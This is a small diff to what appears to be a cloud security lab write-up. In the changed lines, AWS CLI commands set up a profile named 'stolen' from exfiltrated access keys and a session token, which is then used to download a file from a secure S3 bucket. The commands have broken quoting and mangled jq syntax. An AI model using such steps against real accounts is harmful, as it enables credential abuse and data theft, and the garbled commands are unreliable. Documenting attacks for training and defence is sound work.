@@ -80,9 +80,9 @@ AWS CloudShell was utilized to configure a new CLI profile using the stolen Acce
 
 ```bash
 $aws configure set profile.stolen.region ap-southeast-1
-$ aws configure set profile.stolen.aws_access_key_id cat credentials.json | jq-r.AccessKeyId'
+$aws configure set profile.stolen.aws_access_key_id cat credentials.json | jq-r.AccessKeyId'
 $aws configure set profile.stolen.aws_secret_access_key cat credentials.json | jqr.SecretAccessKey"
-$ aws configure set profile.stolen.aws_session_token cat credentials.json | jqr.Token"
+$aws configure set profile.stolen.aws_session_token cat credentials.json | jqr.Token"
 ```
 
 The attacker profile successfully accessed a secure S3 bucket and downloaded a file named secret-information.txt, completing the data exfiltration objective. 
